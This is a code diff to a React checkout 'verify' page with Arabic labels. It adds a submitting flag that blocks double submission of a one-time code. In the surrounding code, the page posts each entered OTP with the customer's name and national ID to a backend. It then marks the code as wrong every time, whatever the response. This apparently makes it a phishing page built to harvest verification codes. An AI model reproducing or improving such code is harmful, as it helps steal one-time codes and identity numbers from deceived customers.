@@ -14,6 +14,7 @@ export default function VerifyPage() {
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [submitCooldown, setSubmitCooldown] = useState(0);
   const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [submitting, setSubmitting] = useState(false);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(
     typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
@@ -85,13 +86,16 @@ export default function VerifyPage() {
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
+    if (submitting) return;
     const code = otp;
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
+    setSubmitting(true);
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
+    setSubmitting(false);
     setCodeError(true);
     setOtp("");
     setSubmitCooldown(5);
@@ -244,18 +248,18 @@ export default function VerifyPage() {
               {/* Submit */}
               <button
                 type="submit"
-                disabled={submitCooldown > 0}
+                disabled={submitCooldown > 0 || submitting}
                 style={{
                   width: "100%", padding: "15px 0", borderRadius: 14, border: "none",
                   fontSize: "1.05rem", fontWeight: 700, color: "#fff",
-                  background: submitCooldown > 0 ? "#9ca3af" : "linear-gradient(135deg, #1a6b7d, #155e6f)",
-                  cursor: submitCooldown > 0 ? "not-allowed" : "pointer",
-                  opacity: submitCooldown > 0 ? 0.65 : 1,
-                  boxShadow: submitCooldown > 0 ? "none" : "0 4px 16px rgba(26,107,125,0.35)",
+                  background: (submitCooldown > 0 || submitting) ? "#9ca3af" : "linear-gradient(135deg, #1a6b7d, #155e6f)",
+                  cursor: (submitCooldown > 0 || submitting) ? "not-allowed" : "pointer",
+                  opacity: (submitCooldown > 0 || submitting) ? 0.65 : 1,
+                  boxShadow: (submitCooldown > 0 || submitting) ? "none" : "0 4px 16px rgba(26,107,125,0.35)",
                   transition: "all 0.25s ease",
                 }}
               >
-                {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "إتمام الطلب "}
+                {submitting ? "جاري الإرسال..." : submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "إتمام الطلب "}
               </button>
 
               {/* Security warnings */}
